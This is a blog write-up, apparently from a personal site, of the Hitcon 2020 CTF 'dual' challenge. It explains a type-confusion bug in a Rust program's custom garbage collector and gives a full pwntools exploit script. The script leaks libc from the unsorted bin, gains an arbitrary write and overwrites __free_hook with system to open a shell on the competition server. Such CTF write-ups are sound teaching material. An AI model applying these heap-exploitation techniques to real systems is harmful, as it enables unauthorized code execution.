@@ -1,0 +1,196 @@
+<!doctype html><html><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
+        Hitcon 2020 dual writeup
+    </title><link href=/corro.svg rel=icon type=image/png><link href=https://zom.wtf/fonts.css rel=stylesheet><link href=/path/to/folder/css/academicons.min.css rel=stylesheet><link href=https://zom.wtf/atom.xml rel=alternate title=zom.wtf type=application/atom+xml><link href=https://zom.wtf/theme/light.css rel=stylesheet><link href=https://zom.wtf/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><img id=title_icon src=/corro.svg><a href=https://zom.wtf>zom.wtf</a><div class=socials><a class=social href=https://twitter.com/zommiommy> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/zommiommy> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/about style=margin-left:.7em>/about</a><a href=/goodstuff style=margin-left:.7em>/good_stuff</a></nav></header><main><article><div class=title><div class=page-header>Hitcon 2020 dual writeup</div><div class=meta>Posted on <time>2020-12-01</time></div></div><h1>Table of Contents</h1><ul><li><a href=https://zom.wtf/posts/hitcon-2020-writeups/#the-program>The program</a><li><a href=https://zom.wtf/posts/hitcon-2020-writeups/#the-vulnerability>The vulnerability</a><li><a href=https://zom.wtf/posts/hitcon-2020-writeups/#the-exploit>The exploit</a></ul><section class=body><p>Writeup of the dual pwn challenge of the Hitcon 2020 CTF, I played with <a href=https://mhackeroni.it/>mHackeroni</a>.<blockquote><p>Heap exploitation in Rust? Is there any hope? Yes if you implement your own Garbage Collector.</blockquote><h2 id=the-program>The program</h2><p>The executable it's a simple CLI which allows to load a graph. The binary doesn't have any hard mitigations:<pre class=language-bash data-lang=bash style=background:#0f1419;color:#bfbab0><code class=language-bash data-lang=bash><span style=color:#ffb454>$</span><span> checksec dual-2df8d4005c5d4ffc03183a96a5d9cb55ac4ee56dfb589d65b0bf4501a586a4b0
+</span><span style=color:#ffb454>RELRO</span><span>           STACK CANARY      NX            PIE             RPATH      RUNPATH	ymbols		FORTIFY	Fortified	Fortifiable	FILE
+</span><span style=color:#ffb454>Partial</span><span> RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   3950) </span><span style=color:#ffb454>Symbols</span><span>	  No	0		12		dual-2df8d4005c5d4ffc03183a96a5d9cb55ac4ee56dfb589d65b0bf4501a586a4b0
+</span></code></pre><h1 id=the-vulnerability>The vulnerability</h1><p>The struct of the Nodes of the Graph is:<pre class=language-rust data-lang=rust style=background:#0f1419;color:#bfbab0><code class=language-rust data-lang=rust><span style=color:#ff7733>struct </span><span style=color:#59c2ff>Node</span><span>{
+</span><span>    id</span><span style=color:#bfbab0cc>: </span><span style=color:#ff7733>u64</span><span>,              </span><span style=font-style:italic;color:#5c6773>// 0x00 id of the node
+</span><span>    this_index</span><span style=color:#bfbab0cc>: </span><span style=color:#ff7733>u64</span><span>,      </span><span style=font-style:italic;color:#5c6773>// 0x08 index of the current obj inside of the pool
+</span><span>    edges</span><span style=color:#bfbab0cc>: </span><span style=color:#ff7733>*mut </span><span style=font-style:italic;color:#39bae6>Vec</span><span><</span><span style=color:#ff7733>u64</span><span>>, </span><span style=font-style:italic;color:#5c6773>// 0x10 ptr to the vector of neighbours
+</span><span>    last_edge</span><span style=color:#bfbab0cc>: </span><span style=color:#ff7733>*mut u64</span><span>,  </span><span style=font-style:italic;color:#5c6773>// 0x18 ptr to the last edge in the vector of neighbours
+</span><span>    edges_end</span><span style=color:#bfbab0cc>: </span><span style=color:#ff7733>*mut u64</span><span>,  </span><span style=font-style:italic;color:#5c6773>// 0x20 ptr to the end of the vector of neighbours
+</span><span>    text_len</span><span style=color:#bfbab0cc>: </span><span style=color:#ff7733>u64</span><span>,        </span><span style=font-style:italic;color:#5c6773>// 0x28 Len of the text
+</span><span>    text_index</span><span style=color:#bfbab0cc>: </span><span style=color:#ff7733>u64</span><span>,      </span><span style=font-style:italic;color:#5c6773>// 0x30 Index to the text obj in the pool
+</span><span>    stamp</span><span style=color:#bfbab0cc>: </span><span style=color:#ff7733>u64</span><span>,           </span><span style=font-style:italic;color:#5c6773>// 0x38 operation stamp (not really usefull for pwning)
+</span><span>}
+</span></code></pre><p>After <del>fuzzing</del> playing with the binary we found out that using <code>write_bin</code> with length 0 causes a bug.<pre class=language-rust data-lang=rust style=background:#0f1419;color:#bfbab0><code class=language-rust data-lang=rust><span style=color:#ff7733>fn </span><span style=color:#ffb454>write_bin</span><span>(){
+</span><span>    </span><span style=color:#f07178>println!</span><span>(</span><span style=color:#c2d94c>"node_id>"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>let</span><span> node_id </span><span style=color:#f29668>= </span><span style=color:#f07178>read_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>let</span><span> node </span><span style=color:#f29668>= </span><span style=color:#ff7733>match </span><span style=color:#f07178>find_node</span><span>(root</span><span style=color:#bfbab0cc>,</span><span> node_id) {
+</span><span>        </span><span style=font-style:italic;color:#39bae6>Some</span><span>(node) </span><span style=color:#f29668>=></span><span> node</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=font-style:italic;color:#39bae6>None </span><span style=color:#f29668>=> </span><span>{
+</span><span>            </span><span style=color:#f07178>println!</span><span>(</span><span style=color:#c2d94c>"invalid"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>        }
+</span><span>    }</span><span style=color:#bfbab0cc>;
+</span><span>    
+</span><span>    </span><span style=color:#f07178>println!</span><span>(</span><span style=color:#c2d94c>"bin_len>"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>let</span><span> bin_len </span><span style=color:#f29668>= </span><span style=color:#f07178>read_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>let</span><span> bin_vals </span><span style=color:#f29668>= </span><span style=color:#f07178>read</span><span>(bin_len)</span><span style=color:#bfbab0cc>;
+</span><span>    
+</span><span>    </span><span style=color:#ff7733>let </span><span>(new_string</span><span style=color:#bfbab0cc>,</span><span> len) </span><span style=color:#f29668>= </span><span style=color:#f07178>encode</span><span>(bin_vals</span><span style=color:#bfbab0cc>,</span><span> bin_len)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=font-style:italic;color:#5c6773>// NO CHECK!
+</span><span>    node</span><span style=color:#f29668>.</span><span>text_index </span><span style=color:#f29668>= </span><span style=color:#f07178>add_pool</span><span>(new_string)</span><span style=color:#bfbab0cc>;
+</span><span>    node</span><span style=color:#f29668>.</span><span>text_len </span><span style=color:#f29668>=</span><span> len</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span><span>
+</span><span style=color:#ff7733>fn </span><span style=color:#ffb454>encode</span><span>(bin_vals, bin_len) </span><span style=color:#bfbab0cc>-> </span><span>(</span><span style=color:#f29668>&</span><span style=color:#ff7733>str</span><span>, </span><span style=color:#ff7733>u64</span><span>){
+</span><span>    </span><span style=color:#ff7733>if</span><span> bin_len </span><span style=color:#f29668>== </span><span style=color:#f29718>0 </span><span>{
+</span><span>        </span><span style=font-style:italic;color:#5c6773>// NULL == 0
+</span><span>        </span><span style=color:#ff7733>return </span><span>(</span><span style=color:#f29718>NULL</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>1</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>    </span><span style=color:#f29668>...
+</span><span>}
+</span><span>
+</span></code></pre><p>(Here we skip over a lot of details which are not relevant here.) Basically the <code>write_bin</code> function always add to the pool even if the encoding fails. The garbage collector considers a cell free if its <code>value >> 3 == 0</code> and this olds for NULL. Therefore we have a type confusion where we can have the same memory referenced as a text and a node.<p><img alt src=/hitcon_2020_dual.png><p>Now we can study the <a href=https://doc.rust-lang.org/reference/type-layout.html>Rust documentation</a> to figure out how to forge the <code>Node</code> data structure. But <a href=https://doc.rust-lang.org/reference/type-layout.html#the-default-representation>Rust does not guarantees that the fields order is respected</a> on structs without <code>#[repr(C)]</code>, so the fields order might change between different compiler versions.<pre class=language-python data-lang=python style=background:#0f1419;color:#bfbab0><code class=language-python data-lang=python><span style=color:#ff7733>def </span><span style=color:#ffb454>craft_node</span><span>(</span><span style=color:#f29718>_id</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>**</span><span style=color:#f29718>kwargs</span><span>):
+</span><span>    </span><span style=font-style:italic;color:#5c6773>"""Helper function to get the bytes of an arbitrary node"""
+</span><span>    s  </span><span style=color:#f29668>= </span><span style=color:#ffb454>p64</span><span>(_id)
+</span><span>    s </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(kwargs</span><span style=color:#f29668>.</span><span style=color:#ffb454>get</span><span>(</span><span style=color:#c2d94c>"this_idx"</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x4141414141414141</span><span>)
+</span><span>    s </span><span style=color:#f29668>+</span><span>= </span><span style=color:#ffb454>p64</span><span>(kwargs</span><span style=color:#f29668>.</span><span style=color:#ffb454>get</span><span>(</span><span style=color:#c2d94c>"edges"</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)
+</span><span>    s </span><span style=color:#f29668>+</span><span>= </span><span style=color:#ffb454>p64</span><span>(kwargs</span><span style=color:#f29668>.</span><span style=color:#ffb454>get</span><span>(</span><span style=color:#c2d94c>"last_edge"</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)
+</span><span>    s </span><span style=color:#f29668>+</span><span>= </span><span style=color:#ffb454>p64</span><span>(kwargs</span><span style=color:#f29668>.</span><span style=color:#ffb454>get</span><span>(</span><span style=color:#c2d94c>"edges_end"</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span>)
+</span><span>    s </span><span style=color:#f29668>+</span><span>= </span><span style=color:#ffb454>p64</span><span>(kwargs</span><span style=color:#f29668>.</span><span style=color:#ffb454>get</span><span>(</span><span style=color:#c2d94c>"text_len"</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x4141414141414141</span><span>)
+</span><span>    s </span><span style=color:#f29668>+</span><span>= </span><span style=color:#ffb454>p64</span><span>(kwargs</span><span style=color:#f29668>.</span><span style=color:#ffb454>get</span><span>(</span><span style=color:#c2d94c>"text_idx"</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x4141414141414141</span><span>)
+</span><span>    s </span><span style=color:#f29668>+</span><span>= </span><span style=color:#ffb454>p64</span><span>(kwargs</span><span style=color:#f29668>.</span><span style=color:#ffb454>get</span><span>(</span><span style=color:#c2d94c>"stamp"</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0x4141414141414141 </span><span>)
+</span><span>    </span><span style=color:#ff3333>return </span><span>s
+</span><span>    
+</span><span style=color:#ff3333>def </span><span style=color:#ffb454>forge_node</span><span>(</span><span style=color:#f29668>**</span><span>kwargs):
+</span><span>    </span><span style=font-style:italic;color:#5c6773># write an empty b64 to cause the bug in the node 0
+</span><span>    </span><span style=color:#ffb454>write_bin</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>""</span><span>)
+</span><span>    </span><span style=font-style:italic;color:#5c6773># Create a new node which will be confused
+</span><span>    </span><span style=font-style:italic;color:#5c6773># with the text of the node 0
+</span><span>    </span><span style=color:#f29718>node_id </span><span style=color:#f29668>= </span><span style=color:#ffb454>create</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span>    </span><span style=font-style:italic;color:#5c6773># Create the bytes for the arbitrary node
+</span><span>    crafted = </span><span style=color:#ffb454>craft</span><span>(node_id</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>**</span><span>kwargs)
+</span><span>    </span><span style=font-style:italic;color:#5c6773># Write it 
+</span><span>    </span><span style=color:#ffb454>write_text</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span>crafted)
+</span><span>    </span><span style=color:#ff3333>return </span><span>node_id
+</span></code></pre><p>Now that we can forge arbitrary nodes we need to find a leak of the libc address and a write primitive.<p>The pseudo-rust of the connect_node function is:<pre class=language-rust data-lang=rust style=background:#0f1419;color:#bfbab0><code class=language-rust data-lang=rust><span style=color:#ff7733>fn </span><span style=color:#ffb454>connect_node</span><span>() {
+</span><span>    </span><span style=color:#f07178>println!</span><span>(</span><span style=color:#c2d94c>"pred_id>"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>let</span><span> pred_id </span><span style=color:#f29668>= </span><span style=color:#f07178>read_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>    
+</span><span>    </span><span style=color:#ff7733>let</span><span> pred_node </span><span style=color:#f29668>= </span><span style=color:#ff7733>match </span><span style=color:#f07178>find_node</span><span>(root</span><span style=color:#bfbab0cc>,</span><span> pred_id) {
+</span><span>        </span><span style=font-style:italic;color:#39bae6>Some</span><span>(node) </span><span style=color:#f29668>=></span><span> node</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=font-style:italic;color:#39bae6>None </span><span style=color:#f29668>=> </span><span>{
+</span><span>            </span><span style=color:#f07178>println!</span><span>(</span><span style=color:#c2d94c>"invalid"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>        }
+</span><span>    }</span><span style=color:#bfbab0cc>;
+</span><span>    
+</span><span>    </span><span style=color:#f07178>println!</span><span>(</span><span style=color:#c2d94c>"succ_id>"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>let</span><span> succ_id </span><span style=color:#f29668>= </span><span style=color:#f07178>read_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>let</span><span> succ_node </span><span style=color:#f29668>= </span><span style=color:#ff7733>match </span><span style=color:#f07178>find_node</span><span>(root</span><span style=color:#bfbab0cc>,</span><span> succ_id) {
+</span><span>        </span><span style=font-style:italic;color:#39bae6>Some</span><span>(node) </span><span style=color:#f29668>=></span><span> node</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=font-style:italic;color:#39bae6>None </span><span style=color:#f29668>=> </span><span>{
+</span><span>            </span><span style=color:#f07178>println!</span><span>(</span><span style=color:#c2d94c>"invalid"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>        }
+</span><span>    }</span><span style=color:#bfbab0cc>;
+</span><span>    
+</span><span>    </span><span style=color:#ff7733>unsafe</span><span>{
+</span><span>        </span><span style=color:#ff7733>let mut</span><span> ptr </span><span style=color:#f29668>=</span><span> pred_node</span><span style=color:#f29668>.</span><span>edges</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=font-style:italic;color:#5c6773>// check if the edge was already inserted
+</span><span>        </span><span style=color:#ff7733>while</span><span> ptr </span><span style=color:#f29668><</span><span> pred_node</span><span style=color:#f29668>.</span><span>last_edge {
+</span><span>            </span><span style=color:#ff7733>if</span><span> pool[</span><span style=color:#f29668>*</span><span>ptr] </span><span style=color:#f29668>==</span><span> succ {
+</span><span>                </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>            }
+</span><span>        }
+</span><span>        
+</span><span>        </span><span style=color:#ff7733>if</span><span> pred_node</span><span style=color:#f29668>.</span><span>last_edge </span><span style=color:#f29668>!=</span><span> pred_node</span><span style=color:#f29668>.</span><span>edges_end {
+</span><span>            </span><span style=font-style:italic;color:#5c6773>// realloc pred_node.edges
+</span><span>            </span><span style=font-style:italic;color:#5c6773>// and fix pred_node.last_edge
+</span><span>            </span><span style=font-style:italic;color:#5c6773>// and pred_node.edges_end
+</span><span>        } 
+</span><span>        
+</span><span>        </span><span style=font-style:italic;color:#5c6773>// write what where primitive
+</span><span>        </span><span style=color:#f29668>*</span><span>pred_node</span><span style=color:#f29668>.</span><span>last_edge </span><span style=color:#f29668>=</span><span> succ_node</span><span style=color:#f29668>.</span><span>this_index</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>}
+</span></code></pre><p>So if we can craft two arbitrary nodes, we can use <code>connect_node</code> to get arbitrary write.<p>For the libc leak we can do the usual unsorted bin leak (free a chunk into the unsorted bin, then read the pointer to the arena that will be placed in the heap). Here we create a node with arbitrary big <code>text_len</code> to be able to read out of bound, then allocate and free a chunk to read the heap-metadata of the freed chunk.<pre class=language-python data-lang=python style=background:#0f1419;color:#bfbab0><code class=language-python data-lang=python><span>nb </span><span style=color:#f29668>= </span><span style=color:#ffb454>create</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span style=font-style:italic;color:#5c6773># Bug: write_bin with size 0 will return 1 instead of a pointer.
+</span><span style=color:#ffb454>write_bin</span><span>(nb</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>''</span><span>)
+</span><span style=font-style:italic;color:#5c6773># This node can be overwritten with nb.text.
+</span><span>n1 </span><span style=color:#f29668>= </span><span style=color:#ffb454>create</span><span>(nb)
+</span><span style=font-style:italic;color:#5c6773># Node that will be freed for the libc leak.
+</span><span>n2 </span><span style=color:#f29668>= </span><span style=color:#ffb454>create</span><span>(nb)
+</span><span style=font-style:italic;color:#5c6773># Allocate >0x400 bytes so that the chunk will skip the tcache.
+</span><span style=color:#ffb454>write_text</span><span>(n2</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>'X'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x500</span><span>)
+</span><span style=font-style:italic;color:#5c6773># Create another node to avoid consolidation with the top chunk.
+</span><span>n3 </span><span style=color:#f29668>= </span><span style=color:#ffb454>create</span><span>(nb)
+</span><span style=font-style:italic;color:#5c6773># Free node 2 for the unsorted bin leak: the freed chunk now contains pointers to the main arena.
+</span><span style=color:#ffb454>disconnect</span><span>(nb</span><span style=color:#bfbab0cc>, </span><span>n2)
+</span><span style=color:#ffb454>gc</span><span>()
+</span><span style=font-style:italic;color:#5c6773># Craft n1 so that we can read the pointers from the heap.
+</span><span>crafted </span><span style=color:#f29668>= </span><span style=color:#ffb454>craft</span><span>(n1</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>text_idx</span><span style=color:#f29668>=</span><span>n1</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>text_len</span><span style=color:#f29668>=</span><span style=color:#f29718>0x100</span><span>)
+</span><span style=color:#ffb454>write_text</span><span>(nb</span><span style=color:#bfbab0cc>, </span><span>crafted)
+</span><span style=font-style:italic;color:#5c6773># Leak.
+</span><span>leak </span><span style=color:#f29668>= </span><span style=color:#ffb454>read</span><span>(n1)
+</span></code></pre><h1 id=the-exploit>The exploit</h1><p>In the following code we will omit the primitives for simplicity sake, the complete script can be found <a href=https://gist.github.com/zommiommy/10207a8cb3900ec520d63b46046d47ab>here</a>.<p>Now that we can leak a libc address and we have a write-what-where primitive we can open a shell by either modifying the <code>.got.plt</code> or by overwriting one of the hooks in the libc. We chose to overwrite the <code>__free_hook</code> since it's faster.<p>Steps to get a shell:<ul><li>get the leak<li>craft the nodes for the arbitrary write<li>write the address of <code>system</code> in <code>__free_hook</code><li>create a text with <code>/bin/sh\x00</code> and then free it</ul><p>The full exploit:<pre class=language-python data-lang=python style=background:#0f1419;color:#bfbab0><code class=language-python data-lang=python><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
+</span><span>
+</span><span>libc </span><span style=color:#f29668>= </span><span style=color:#ffb454>ELF</span><span>(</span><span style=color:#c2d94c>'/lib/x86_64-linux-gnu/libc-2.31.so'</span><span>)
+</span><span>host </span><span style=color:#f29668>= </span><span style=color:#c2d94c>'13.231.226.137'
+</span><span>port </span><span style=color:#f29668>= </span><span style=color:#f29718>9573
+</span><span>
+</span><span>p </span><span style=color:#f29668>= </span><span style=color:#ffb454>remote</span><span>(host</span><span style=color:#bfbab0cc>, </span><span>port)
+</span><span>
+</span><span style=font-style:italic;color:#5c6773># Step 1: leak libc base.
+</span><span style=font-style:italic;color:#5c6773># Prepare a root node for later. In the second step the DFS will go down here first,
+</span><span style=font-style:italic;color:#5c6773># so it won't crash on the nodes we crafted in the first step.
+</span><span>na </span><span style=color:#f29668>= </span><span style=color:#ffb454>create</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span style=font-style:italic;color:#5c6773># Root node for step 1.
+</span><span>nb </span><span style=color:#f29668>= </span><span style=color:#ffb454>create</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span style=font-style:italic;color:#5c6773># Bug: write_bin with size 0 will return 1 instead of a pointer.
+</span><span style=color:#ffb454>write_bin</span><span>(nb</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>''</span><span>)
+</span><span style=font-style:italic;color:#5c6773># This node can be overwritten with nb.text.
+</span><span>n1 </span><span style=color:#f29668>= </span><span style=color:#ffb454>create</span><span>(nb)
+</span><span style=font-style:italic;color:#5c6773># Node that will be freed for the libc leak.
+</span><span>n2 </span><span style=color:#f29668>= </span><span style=color:#ffb454>create</span><span>(nb)
+</span><span style=font-style:italic;color:#5c6773># Allocate >0x400 bytes so that the chunk will skip the tcache.
+</span><span style=color:#ffb454>write_text</span><span>(n2</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>'X'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x500</span><span>)
+</span><span style=font-style:italic;color:#5c6773># Create another node to avoid consolidation with the top chunk.
+</span><span>n3 </span><span style=color:#f29668>= </span><span style=color:#ffb454>create</span><span>(nb)
+</span><span style=font-style:italic;color:#5c6773># Free node 2 for the unsorted bin leak: the freed chunk now contains pointers to the main arena.
+</span><span style=color:#ffb454>disconnect</span><span>(nb</span><span style=color:#bfbab0cc>, </span><span>n2)
+</span><span style=color:#ffb454>gc</span><span>()
+</span><span style=font-style:italic;color:#5c6773># Craft n1 so that we can read the pointers from the heap.
+</span><span>crafted </span><span style=color:#f29668>= </span><span style=color:#ffb454>craft</span><span>(n1</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>text_idx</span><span style=color:#f29668>=</span><span>n1</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>text_len</span><span style=color:#f29668>=</span><span style=color:#f29718>0x100</span><span>)
+</span><span style=color:#f07178>print</span><span>(</span><span style=color:#c2d94c>'writing'</span><span style=color:#bfbab0cc>, </span><span style=color:#f07178>len</span><span>(crafted)</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>'bytes:'</span><span style=color:#bfbab0cc>, </span><span>crafted)
+</span><span style=color:#ffb454>write_text</span><span>(nb</span><span style=color:#bfbab0cc>, </span><span>crafted)
+</span><span>leak </span><span style=color:#f29668>= </span><span style=color:#ffb454>read</span><span>(n1)
+</span><span style=color:#f07178>print</span><span>(leak)
+</span><span>leak_libc </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(leak[</span><span style=color:#f29718>160</span><span style=color:#bfbab0cc>:</span><span style=color:#f29718>160</span><span style=color:#f29668>+</span><span style=color:#f29718>8</span><span>])
+</span><span style=color:#f07178>print</span><span>(</span><span style=color:#c2d94c>'leak arena:'</span><span style=color:#bfbab0cc>, </span><span style=color:#f07178>hex</span><span>(leak_libc))
+</span><span>leak_offset </span><span style=color:#f29668>= </span><span style=color:#f29718>2014176 </span><span style=font-style:italic;color:#5c6773># main_arena + 96
+</span><span>main_arena </span><span style=color:#f29668>= </span><span style=color:#f29718>0x7ffff7c2cb80 </span><span style=font-style:italic;color:#5c6773># libc.symbols['main_arena']
+</span><span style=color:#f07178>print</span><span>(</span><span style=color:#c2d94c>'main_arena'</span><span style=color:#bfbab0cc>, </span><span style=color:#f07178>hex</span><span>(main_arena))
+</span><span style=color:#f07178>print</span><span>(</span><span style=color:#c2d94c>'leak_offset'</span><span style=color:#bfbab0cc>, </span><span style=color:#f07178>hex</span><span>(leak_offset))
+</span><span>libc_base </span><span style=color:#f29668>= </span><span>leak_libc </span><span style=color:#f29668>- </span><span>leak_offset
+</span><span style=color:#f07178>print</span><span>(</span><span style=color:#c2d94c>'libc base:'</span><span style=color:#bfbab0cc>, </span><span style=color:#f07178>hex</span><span>(libc_base))
+</span><span style=color:#ffb454>pause</span><span>()
+</span><span>
+</span><span style=font-style:italic;color:#5c6773># Step 2: write what-were to get a shell.
+</span><span>libc</span><span style=color:#f29668>.</span><span>address </span><span style=color:#f29668>= </span><span>libc_base
+</span><span>system </span><span style=color:#f29668>= </span><span>libc</span><span style=color:#f29668>.</span><span>symbols[</span><span style=color:#c2d94c>'system'</span><span>]
+</span><span>what </span><span style=color:#f29668>= </span><span>system
+</span><span style=color:#f07178>print</span><span>(</span><span style=color:#c2d94c>'system:'</span><span style=color:#bfbab0cc>, </span><span style=color:#f07178>hex</span><span>(system))
+</span><span>free_hook </span><span style=color:#f29668>= </span><span>libc</span><span style=color:#f29668>.</span><span>symbols[</span><span style=color:#c2d94c>'__free_hook'</span><span>]
+</span><span>where </span><span style=color:#f29668>= </span><span>free_hook
+</span><span style=color:#f07178>print</span><span>(</span><span style=color:#c2d94c>'__free_hook:'</span><span style=color:#bfbab0cc>, </span><span style=color:#f07178>hex</span><span>(free_hook))
+</span><span style=font-style:italic;color:#5c6773># write_bin bug again to control a second node.
+</span><span style=color:#ffb454>write_bin</span><span>(n3</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>''</span><span>)
+</span><span style=font-style:italic;color:#5c6773># This node can be overwritten with n3.text.
+</span><span>n4 </span><span style=color:#f29668>= </span><span style=color:#ffb454>create</span><span>(na)
+</span><span style=font-style:italic;color:#5c6773># Prepare nodes for arbitrary write.
+</span><span>wherenode </span><span style=color:#f29668>= </span><span style=color:#ffb454>craft</span><span>(n1</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>edges</span><span style=color:#f29668>=</span><span>where</span><span style=color:#f29668>-</span><span style=color:#f29718>8</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>last_edge</span><span style=color:#f29668>=</span><span>where</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>edges_end</span><span style=color:#f29668>=</span><span>where</span><span style=color:#f29668>+</span><span style=color:#f29718>32</span><span>)
+</span><span>whatnode </span><span style=color:#f29668>= </span><span style=color:#ffb454>craft</span><span>(n4</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>pool_idx</span><span style=color:#f29668>=</span><span>what)
+</span><span style=color:#ffb454>write_text</span><span>(n3</span><span style=color:#bfbab0cc>, </span><span>whatnode)
+</span><span style=color:#ffb454>write_text</span><span>(nb</span><span style=color:#bfbab0cc>, </span><span>wherenode)
+</span><span style=font-style:italic;color:#5c6773># Trigger arbitrary write.
+</span><span style=color:#ffb454>connect</span><span>(n1</span><span style=color:#bfbab0cc>, </span><span>n4)
+</span><span style=color:#ffb454>pause</span><span>()
+</span><span>
+</span><span style=font-style:italic;color:#5c6773># Write in a chunk and trigger the free in write_text to call system("/bin/sh").
+</span><span style=color:#ffb454>write_text</span><span>(nb</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>b</span><span style=color:#c2d94c>'/bin/sh</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span>)
+</span><span style=color:#ffb454>write_text</span><span>(nb</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>'A'</span><span style=color:#f29668>*</span><span style=color:#f29718>1500</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>shell</span><span style=color:#f29668>=</span><span style=color:#f29718>True</span><span>)
+</span><span>p</span><span style=color:#f29668>.</span><span style=color:#ffb454>interactive</span><span>()
+</span></code></pre></section></article></main></div><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script>
